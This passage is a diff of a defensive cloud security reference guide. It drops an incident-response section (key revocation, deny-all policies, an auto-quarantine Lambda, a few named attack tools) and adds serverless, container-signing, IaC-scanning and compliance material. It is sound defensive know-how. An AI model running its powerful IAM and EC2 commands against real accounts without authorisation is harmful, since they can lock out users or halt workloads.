+- Section 5: Storage (bucket public access, uniform IAM, logging, versioning, retention)
+- Section 6: Cloud SQL (SSL, authorized networks, contained DB auth)
+- Section 7: BigQuery (CMK encryption, public access)
+
+---
+
+## 10. Serverless, DevSecOps & Cloud Compliance
+
+### 10.1 Lambda Security
+
+#### Execution Role Least Privilege
+
+Lambda functions run with an IAM execution role. Follow least privilege strictly.
+
 ```json
 {
   "Version": "2012-10-17",
   "Statement": [
     {
       "Effect": "Allow",
-      "Action": [
-        "logs:CreateLogGroup",
-        "logs:CreateLogStream",
-        "logs:PutLogEvents"
-      ],
-      "Resource": "arn:aws:logs:us-east-1:ACCOUNT:log-group:/aws/lambda/my-function:*"
-    },
-    {
-      "Effect": "Allow",
       "Action": ["s3:GetObject"],
-      "Resource": "arn:aws:s3:::specific-bucket/specific-prefix/*"
+      "Resource": "arn:aws:s3:::specific-bucket/prefix/*"
     },
     {
       "Effect": "Allow",
-      "Action": ["secretsmanager:GetSecretValue"],
-      "Resource": "arn:aws:secretsmanager:us-east-1:ACCOUNT:secret:my-secret-*"
+      "Action": ["logs:CreateLogGroup", "logs:CreateLogStream", "logs:PutLogEvents"],
+      "Resource": "arn:aws:logs:*:*:log-group:/aws/lambda/function-name:*"
     }
   ]
 }
 ```
 
-**Function URL Security:**
-```python
-# INSECURE: public function URL with no auth
-FunctionUrl:
-  AuthType: NONE  # Anyone on the internet can invoke
+**Common Lambda vulnerabilities**:
 
-# SECURE: IAM auth required
-FunctionUrl:
-  AuthType: AWS_IAM
-  Cors:
-    AllowOrigins:
-      - "https://app.example.com"
-```
-
-### Serverless Attack Tools
-- **ServerlessGoat** — deliberately vulnerable Lambda app for learning: `github.com/OWASP/ServerlessGoat`
-- **PurpleCloud** — serverless attack simulation environment
-- **SLSDetect** — serverless-specific detection rules
-- **WeirdAAL** — AWS attack library including Lambda-specific techniques
-
----
-
-## 9. Cloud Detection & Response
-
-### Cloud IR Priorities
-
-**Phase 1 — Contain (minutes)**
-```bash
-# AWS: Revoke IAM access key
-aws iam update-access-key \
-  --access-key-id AKIAIOSFODNN7EXAMPLE \
-  --status Inactive \
-  --user-name compromised-user
-
-# AWS: Deny all STS sessions for a role (attach inline deny policy)
-aws iam put-role-policy --role-name CompromisedRole \
-  --policy-name EmergencyDeny \
-  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Deny","Action":"*","Resource":"*"}]}'
-
-# AWS: Isolate EC2 (move to deny-all security group)
-aws ec2 modify-instance-attribute \
-  --instance-id i-0123456789abcdef0 \
-  --groups sg-00000000000000000  # Pre-created deny-all SG
-
-# Azure: Disable user account
-az ad user update --id user@corp.com --account-enabled false
-
-# Azure: Revoke all user sessions
-az ad user revoke-sign-in-sessions --id user@corp.com
-
-# GCP: Disable service account
-gcloud iam service-accounts disable sa-name@project.iam.gserviceaccount.com
-
-# GCP: Remove SA from project IAM
-gcloud projects remove-iam-policy-binding PROJECT_ID \
-  --member="serviceAccount:sa@project.iam.gserviceaccount.com" \
-  --role="roles/owner"
-```
-
-**Phase 2 — Preserve Evidence**
-```bash
-# AWS: Create EBS snapshot before terminating
-aws ec2 create-snapshot --volume-id vol-0123456789abcdef0 \
-  --description "IR-$(date +%Y%m%d-%H%M%S)-forensic"
-
-# AWS: Export CloudTrail to S3 for investigation
-aws cloudtrail lookup-events \
-  --lookup-attributes AttributeKey=Username,AttributeValue=compromised-user \
-  --start-time 2024-01-01T00:00:00 \
-  --end-time 2024-01-02T00:00:00 \
-  > cloudtrail-events.json
-
-# AWS: Enable VPC Flow Logs if not already enabled
-aws ec2 create-flow-logs --resource-type VPC \
-  --resource-ids vpc-0123456789abcdef0 \
-  --traffic-type ALL \
-  --log-destination-type s3 \
-  --log-destination arn:aws:s3:::forensics-bucket/flow-logs/
-```
-
-**Phase 3 — Investigate**
-```bash
-# AWS: Enumerate what the compromised identity did
-aws cloudtrail lookup-events \
-  --lookup-attributes AttributeKey=AccessKeyId,AttributeValue=AKIAIOSFODNN7EXAMPLE
-
-# List all IAM changes in last 24h
-aws cloudtrail lookup-events \
-  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateAccessKey \
-  --start-time $(date -u -d '24 hours ago' +%Y-%m-%dT%H:%M:%SZ)
-
-# List all S3 data events for bucket
-aws cloudtrail lookup-events \
-  --lookup-attributes AttributeKey=ResourceName,AttributeValue=arn:aws:s3:::sensitive-bucket
-
-# Check for new IAM users/roles created
-aws iam list-users --query 'Users[?CreateDate>=`2024-01-01`]'
-aws iam list-roles --query 'Roles[?CreateDate>=`2024-01-01`]'
-```
-
-### SIEM Integration Architecture
-
-```
-AWS:
-CloudTrail → S3 → EventBridge / SQS → Lambda → SIEM (Splunk/Sentinel/Chronicle)
-GuardDuty findings → SecurityHub → EventBridge → Lambda → SIEM + ticketing
-VPC Flow Logs → S3 / CWL → SIEM
-
-Azure:
-Activity Log → Event Hub → SIEM
-Entra Sign-in Logs → Log Analytics → Sentinel (built-in)
-Defender for Cloud alerts → Sentinel (native connector)
-
-GCP:
-Cloud Audit Logs → Pub/Sub → SIEM
-SCC findings → Pub/Sub → SIEM / Chronicle
-VPC Flow Logs → Cloud Storage → SIEM
-```
-
-### Cloud SOAR Playbook — Auto-Quarantine on GuardDuty
-
-```python
-# Lambda function triggered by GuardDuty HIGH severity finding via EventBridge
-
-import boto3
-import json
-
-def lambda_handler(event, context):
-    finding = event['detail']
-    severity = finding['severity']
-
-    if severity < 7.0:  # Only act on HIGH (7+) and CRITICAL (9+)
-        return {"action": "no_action", "severity": severity}
-
-    finding_type = finding['type']
-
-    # EC2 instance compromise
-    if 'instanceDetails' in finding.get('resource', {}):
-        instance_id = finding['resource']['instanceDetails']['instanceId']
-        ec2 = boto3.client('ec2')
-
-        # Move to quarantine security group
-        ec2.modify_instance_attribute(
-            InstanceId=instance_id,
-            Groups=['sg-QUARANTINE_SG_ID']
-        )
-
-        # Create forensic snapshot
-        instance = ec2.describe_instances(InstanceIds=[instance_id])
-        for device in instance['Reservations'][0]['Instances'][0].get('BlockDeviceMappings', []):
-            vol_id = device['Ebs']['VolumeId']
-            ec2.create_snapshot(
-                VolumeId=vol_id,
-                Description=f"Auto-IR-{finding['id'][:8]}"
-            )
-
-    # IAM credential compromise
-    if 'accessKeyDetails' in finding.get('resource', {}):
-        access_key_id = finding['resource']['accessKeyDetails']['accessKeyId']
-        user_name = finding['resource']['accessKeyDetails'].get('userName', '')
-
-        iam = boto3.client('iam')
-        if user_name:
-            iam.update_access_key(
-                UserName=user_name,
-                AccessKeyId=access_key_id,
-                Status='Inactive'
-            )
-
-    return {"action": "quarantine_applied", "finding_id": finding['id']}
-```
-
----
-
-## 10. Cloud Compliance & Frameworks
-
-### AWS Well-Architected Security Pillar
-
-Six best practice areas:
-
-| Area | Key Controls |
-|---|---|
-| **Identity and Access Management** | Root MFA, least privilege, no long-term keys, SCP, Permission Boundaries |
-| **Detection** | CloudTrail, Config, GuardDuty, SecurityHub, CloudWatch alarms |
-| **Infrastructure Protection** | VPC design, SGs, NACLs, WAF, Shield, Systems Manager (no SSH) |
-| **Data Protection** | Encryption at rest (KMS), in transit (TLS), S3 versioning, Macie |
-| **Incident Response** | Playbooks, IR role, GameDays, forensic account, AWS CIRT partnership |
-| **Application Security** | Static/dynamic analysis, Inspector, CodeGuru, secure pipeline |
-
-### CIS Benchmarks
-
-Free PDF download from **cisecurity.org**:
-
-| Benchmark | Version | Key Focus Areas |
+| Vulnerability | Risk | Mitigation |
 |---|---|---|
-| CIS AWS Foundations | 2.0 (2023) | IAM (14 recs), Storage, Logging, Monitoring, Networking |
-| CIS Azure Foundations | 2.0 (2023) | Identity, Defender, Storage, Database, Networking, Logging |
-| CIS GCP Foundations | 2.0 (2023) | IAM, Logging, VMs, Storage, Cloud SQL, BigQuery, Networking |
-| CIS EKS | 1.4 | Control plane, worker nodes, RBAC, networking |
-| CIS Docker | 1.6 | Host config, daemon config, container images, runtime |
+| Over-privileged execution role | Lateral movement | Least-privilege role, use iamlive |
+| Secrets in environment variables | Credential exposure in logs/config | Use Secrets Manager + Lambda extension |
+| Event injection | Data exfiltration, SSRF, path traversal | Validate/sanitize all input from events |
+| Dependency vulnerabilities | RCE, cryptojacking | AWS Inspector Lambda scanning, pip-audit |
+| VPC misconfig | Data exfiltration via Lambda | Enable VPC for sensitive functions + use VPC endpoints |
+| Overly permissive resource policy | Unauthorized invocation | Restrict lambda:InvokeFunction to specific principals |
 
-### CSA Cloud Controls Matrix (CCM) v4.0
-
-197 control objectives across 17 domains:
-- AIS (Application & Interface Security)
-- BCR (Business Continuity Management)
-- CCC (Change Control & Configuration Management)
-- CEK (Cryptography, Encryption & Key Management)
-- DSP (Data Security & Privacy Lifecycle Management)
-- GRC (Governance, Risk & Compliance)
-- HRS (Human Resources Security)
-- IAM (Identity & Access Management)
-- IPY (Interoperability & Portability)
-- IVS (Infrastructure & Virtualization Security)
-- LOG (Logging & Monitoring)
-- SEF (Security Incident Management, E-Discovery & Cloud Forensics)
-- STA (Supply Chain Management, Transparency & Accountability)
-- TVM (Threat & Vulnerability Management)
-- UEM (Universal Endpoint Management)
-
-### Compliance Framework Mapping
-
-| Framework | Applicability | Key Cloud Requirements |
-|---|---|---|
-| **FedRAMP** | US federal contractors | NIST 800-53 Rev 5; Low/Moderate/High; ATO process; monthly ConMon |
-| **ISO 27017** | Cloud-specific controls | Extension of 27001; provider and customer controls; virtual machine hardening |
-| **SOC 2 Type II** | Service providers | Trust Service Criteria; 6-12 month audit period; covers security, availability, confidentiality |
-| **PCI DSS v4.0** | Cardholder data | Network segmentation; encryption; access control; logging; IR; 12 requirements |
-| **HIPAA** | US healthcare | ePHI protection; BAA with cloud provider; encryption addressable; audit controls |
-| **GDPR** | EU personal data | Data residency; DPA with cloud provider; breach notification 72h; right to erasure |
-| **NIST CSF 2.0** | Voluntary framework | Govern, Identify, Protect, Detect, Respond, Recover functions; tiers and profiles |
-
-### CISA SCuBA (Secure Cloud Business Applications)
-
-Hardening baselines for Microsoft 365 cloud services:
-
+**Environment variable secrets** — use Secrets Manager Lambda extension:
 ```bash
-# ScubaGear — automated M365 configuration assessment
-git clone https://github.com/cisagov/ScubaGear
-cd ScubaGear
-Install-Module -Name ScubaGear -Force
-Import-Module ScubaGear
-Invoke-SCuBA -ProductNames teams,exo,aad,powerplatform,sharepoint,onedrive
-# Generates HTML report with pass/fail against CISA baseline policies
+# Add layer (region-specific ARN)
+aws lambda update-function-configuration \
+  --function-name my-function \
+  --layers arn:aws:lambda:us-east-1:177933569100:layer:AWS-Parameters-and-Secrets-Lambda-Extension:17
+
+# Access secret at runtime (no SDK call needed)
+import urllib.request
+headers = {'X-Aws-Parameters-Secrets-Token': os.environ['AWS_SESSION_TOKEN']}
+secret = urllib.request.urlopen(urllib.request.Request(
+  'http://localhost:2773/secretsmanager/get?secretId=mySecret', headers=headers
+)).read()
 ```
 
-Products covered: Azure AD, Exchange Online, Teams, SharePoint, OneDrive, Power Platform, Defender for O365.
+**Lambda Power Tools** (AWS):
+- Structured logging, metrics, tracing (X-Ray), event validation, idempotency, feature flags
+- Input validation with Pydantic models prevents event injection
 
 ---
 
-## Quick Reference: Detection & Response Checklists
+### 10.2 Azure Functions & Cloud Run Security
 
-### AWS Credential Compromise Checklist
+**Azure Functions**:
+- **Managed identity**: Use system-assigned or user-assigned MI — no credentials in code
+- **Key Vault references**: App settings reference Key Vault secrets directly (`@Microsoft.KeyVault(SecretUri=...)`)
+- **Network isolation**: Restrict inbound triggers (IP restrictions, private endpoints), restrict outbound (VNet integration)
+- **Authentication/authorization**: Built-in Easy Auth (validates JWT from Entra ID)
+- **CORS**: Restrict allowed origins; never use `*` in production
 
-- [ ] Identify affected access key(s): `aws sts get-caller-identity`
-- [ ] Disable affected key: `aws iam update-access-key --status Inactive`
-- [ ] Review key activity: CloudTrail `lookup-events` for access key ID
-- [ ] Check for new IAM entities created: `list-users`, `list-roles`, `list-policies`
-- [ ] Check for new S3 buckets or changes: `aws s3 ls` and S3 events in CloudTrail
-- [ ] Check for Lambda functions or EC2 launched by attacker
-- [ ] Check for new VPC/SG resources (persistence or exfil infrastructure)
-- [ ] Check all regions (attacker may pivot to less-monitored regions)
-- [ ] Rotate affected credentials and revoke all active sessions
-- [ ] Review and tighten IAM policies; enable permission boundaries
-- [ ] Review GuardDuty findings for the timeframe
-
-### Azure Account Compromise Checklist
-
-- [ ] Disable compromised user: `az ad user update --account-enabled false`
-- [ ] Revoke all sessions: Entra ID → User → Revoke sessions
-- [ ] Review sign-in logs: unusual IPs, locations, user agents
-- [ ] Review audit logs: role assignments, MFA changes, app registrations
-- [ ] Check Azure Activity Log: resource creation, policy changes, RBAC changes
-- [ ] Review Defender for Cloud alerts and recommendations
-- [ ] Check for new service principals or app registrations
-- [ ] Check for new RBAC assignments at subscription level
-- [ ] Review conditional access policy changes
-- [ ] Enable or review MFA enforcement; check for authentication method changes
-- [ ] Check Microsoft Sentinel incidents for correlated activity
+**Google Cloud Run**:
+- Runs containers — all container security practices apply
+- **Service identity**: Each Cloud Run service has a service account; follow least privilege
+- **Ingress control**: Internal, Internal + Cloud Load Balancing, or All
+- **Egress control**: Route through VPC connector for network policy enforcement
+- **Binary Authorization**: Require signed container images before deployment
+- **Secret Manager integration**: Mount secrets as volumes or env vars (recommended over plain env vars)
+- **Request timeout**: Default 5 min, max 60 min — tune to reduce attack window
 
 ---
 
-*Reference: AWS Security Documentation, Microsoft Learn Security, GCP Security Best Practices, CIS Benchmarks, NIST SP 800-207, CSA CCM v4.0, CISA SCuBA*
+### 10.3 Container Registry Security
+
+**AWS ECR**:
+```bash
+# Enable image scanning on push
+aws ecr put-image-scanning-configuration \
+  --repository-name my-repo \
+  --image-scanning-configuration scanOnPush=true
+
+# Enhanced scanning (Inspector v2 — continuous CVE monitoring)
+aws ecr put-registry-scanning-configuration \
+  --scan-type ENHANCED \
+  --rules '[{"repositoryFilters":[{"filter":"*","filterType":"WILDCARD"}],"scanFrequency":"CONTINUOUS_SCAN"}]'
+
+# Image signing with Notation (AWS Signer)
+aws signer put-signing-profile --profile-name my-profile \
+  --platform-id AmazonECS-docker-linux-x86
+
+notation sign --plugin com.amazonaws.signer.notation.plugin \
+  --id arn:aws:signer:us-east-1:123:signing-profiles/my-profile \
+  123456789012.dkr.ecr.us-east-1.amazonaws.com/my-repo:latest
+
+# Lifecycle policy (remove untagged images older than 30 days)
+aws ecr put-lifecycle-policy --repository-name my-repo \
+  --lifecycle-policy-text '{"rules":[{"rulePriority":1,"selection":{"tagStatus":"untagged","countType":"sinceImagePushed","countUnit":"days","countNumber":30},"action":{"type":"expire"}}]}'
+```
+
+**Cosign** (sigstore) — image signing:
+```bash
+# Generate key pair
+cosign generate-key-pair
+
+# Sign image
+cosign sign --key cosign.key gcr.io/my-project/my-image:tag
+
+# Verify signature
+cosign verify --key cosign.pub gcr.io/my-project/my-image:tag
+
+# Keyless signing (GitHub Actions — uses OIDC)
+cosign sign --identity-token=$(cat /tmp/oidc-token) gcr.io/my-project/my-image:tag
+```
+
+---
+
+### 10.4 IaC Security Scanning
+
+**Checkov** (Bridgecrew/Prisma Cloud):
+```bash
+pip install checkov
+checkov -d ./terraform                    # Scan all Terraform files
+checkov -f main.tf                        # Scan specific file
+checkov -d . --framework cloudformation  # CloudFormation
+checkov -d . --framework kubernetes      # Kubernetes manifests
+checkov -d . --framework arm             # Azure ARM templates
+checkov -d . --check CKV_AWS_18         # Run specific check only
+checkov -d . --skip-check CKV_AWS_18   # Skip specific check
+checkov -d . --output json > results.json
+checkov -d . --compact --quiet          # CI/CD mode
+```
+
+**tfsec** (now part of Trivy):
+```bash
+tfsec ./terraform                         # Scan Terraform
+tfsec --exclude aws-s3-enable-versioning ./terraform
+tfsec --format json ./terraform > results.json
+# Or use Trivy:
+trivy config ./terraform                  # IaC scanning
+trivy fs .                                # Filesystem + IaC + secrets
+```
+
+**cfn-nag** (CloudFormation):
+```bash
+gem install cfn-nag
+cfn_nag_scan --input-path template.yaml
+cfn_nag_scan --input-path ./templates/ --template-pattern '*.yaml'
+```
+
+**terrascan** (Accurics):
+```bash
+pip install terrascan
+terrascan scan -t aws -i terraform         # AWS Terraform
+terrascan scan -t azure -i arm            # Azure ARM
+terrascan scan -t gcp -i terraform        # GCP Terraform
+terrascan scan -i k8s -d ./manifests/    # Kubernetes
+```
+
+**Trivy** (comprehensive):
+```bash
+trivy image nginx:latest                   # Container image scan
+trivy fs .                                 # Filesystem (deps + IaC + secrets)
+trivy repo https://github.com/org/repo    # Git repository
+trivy config ./                            # IaC configuration
+trivy k8s --report summary cluster        # Live Kubernetes cluster
+```
+
+---
+
+### 10.5 Cloud Compliance Frameworks
+
+#### FedRAMP (Federal Risk and Authorization Management Program)
+
+**Authorization process (ATO — Authority to Operate)**:
+1. **Initiation**: Select impact level (Low/Moderate/High), choose authorization path (Agency ATO or JAB P-ATO)
+2. **Documentation**: System Security Plan (SSP) — 300+ controls based on NIST SP 800-53
+3. **Assessment**: 3PAO (Third-Party Assessment Organization) performs independent security assessment
+4. **Authorization**: Authorizing Official (AO) reviews Package (SSP + SAR + POA&M) and grants ATO
+5. **ConMon (Continuous Monitoring)**: Monthly vulnerability scans, annual assessments, incident reporting within 1 hour (High) / 1 day (Moderate/Low)
+
+**Key requirements**: FIPS 140-2 validated encryption, MFA for privileged users, PIV/CAC for federal users (High), FedRAMP-authorized third-party services only, US-only data residency.
+
+**FedRAMP Marketplace**: List of authorized cloud services (CSOs). Required for federal agencies to use.
+
+#### SOC 2 Type II
+
+- **Trust Services Criteria (TSC)**: Security (required), Availability, Processing Integrity, Confidentiality, Privacy
+- **Type I**: Point-in-time assessment of controls design
+- **Type II**: 6-12 month assessment of controls operating effectiveness
+- **Common cloud controls**: Encryption at rest/transit, access control reviews, change management, incident response, vendor management, monitoring and alerting
+- **Report audience**: Service organizations to demonstrate security to customers (not public)
+
+#### ISO 27001
+
+- **ISMS** (Information Security Management System): Risk-based management framework
+- **Annex A controls**: 93 controls in 4 themes (Organizational, People, Physical, Technological) — ISO 27002 provides implementation guidance
+- **Certification**: Accredited CB (certification body) audits; certificate valid 3 years with annual surveillance audits
+- **Statement of Applicability (SoA)**: Document all controls, justification for inclusion/exclusion
+
+#### HIPAA (Health Insurance Portability and Accountability Act)
+
+- **Covered entities**: Healthcare providers, health plans, clearinghouses
+- **Business Associates**: Vendors processing PHI on behalf of covered entities — require BAA (Business Associate Agreement)
+- **BAA with cloud providers**: AWS, Azure, GCP all offer BAAs; specific services covered (review their HIPAA-eligible services lists)
+- **Safeguards**: Administrative (training, policies, risk analysis), Physical (facility access, workstation security), Technical (access control, audit logs, encryption, integrity)
+- **Breach notification**: Within 60 days of discovery (500+ individuals → notify HHS + media; <500 → annual log to HHS)
+
+#### CCPA/CPRA (California Consumer Privacy Act)
+
+- **Consumer rights**: Access, deletion, portability, opt-out of sale/sharing, correct inaccurate data, limit sensitive personal information use
+- **Sensitive personal information**: SSN, driver's license, financial account, precise geolocation, racial/ethnic origin, health, biometric, sexual orientation, union membership
+- **Data processing records**: Document categories of PI collected, purposes, retention periods, third parties shared with
+- **Security**: "Reasonable security measures" — referencing CIS Controls, NIST CSF
+
+---
+
+### 10.6 Shared Responsibility Model
+
+**Summary by service type**:
+
+| Layer | IaaS (EC2/VM/GCE) | PaaS (RDS/App Service/Cloud SQL) | SaaS (Salesforce/O365/Workspace) |
+|---|---|---|---|
+| Data | Customer | Customer | Customer |
+| Application | Customer | Customer | Vendor |
+| Runtime | Customer | Vendor | Vendor |
+| Middleware | Customer | Vendor | Vendor |
+| OS | Customer | Vendor | Vendor |
+| Virtualization | Vendor | Vendor | Vendor |
+| Physical | Vendor | Vendor | Vendor |
+
+**Inherited controls** (from cloud provider): Physical security, environmental controls, network infrastructure, hypervisor security.
+
+**Shared controls**: Patch management (provider patches infrastructure; customer patches OS/apps), configuration management, training, incident response (provider handles infrastructure; customer handles application layer).
+
+**Customer-owned always**: Data classification, identity management, application security, network traffic protection (encryption in transit), client-side encryption.
+
+---
+
+### 10.7 Cloud Security Certifications
+
+| Certification | Issuer | Focus | Prerequisites |
+|---|---|---|---|
+| AWS Certified Security – Specialty (SCS-C02) | AWS | AWS security services, incident response, logging, infrastructure security, data protection, identity | AWS experience; AWS SAA or SAP recommended |
+| Google Professional Cloud Security Engineer (PCSE) | Google | GCP IAM, VPC security, compliance, data protection, logging | GCP Associate Cloud Engineer recommended |
+| AZ-500: Microsoft Azure Security Technologies | Microsoft | Entra ID, Azure Security Center, network security, data security | AZ-104 recommended |
+| CCSP (Certified Cloud Security Professional) | (ISC)² | Vendor-neutral cloud security architecture, design, operations, legal compliance | 5 years IT exp. including 3 in infosec + 1 in cloud |
+| CCSK (Certificate of Cloud Security Knowledge) | CSA | CSA Guidance, ENISA cloud computing, CCM | No prerequisites (exam only) |
+| AWS Certified Solutions Architect – Professional (SAP-C02) | AWS | Broad AWS architecture; valuable for security context | AWS SAA |
+| CompTIA Cloud+ | CompTIA | Vendor-neutral cloud infrastructure and security | CompTIA Network+ recommended |
+
+**Study resources**:
+- AWS: re:Invent security talks (YouTube), AWS Security Blog, AWS workshops (workshops.aws)
+- Azure: Microsoft Learn, SC-100/SC-200/SC-300 content
+- GCP: Google Cloud Skills Boost, Security Engineer learning path
+- General: SANS FOR509 (Cloud Forensics), SEC510 (Cloud Security Controls)
+
+---
+
+*Last updated: 2026-05-06 | Maintained by TeamStarWolf | For professional cybersecurity reference use*
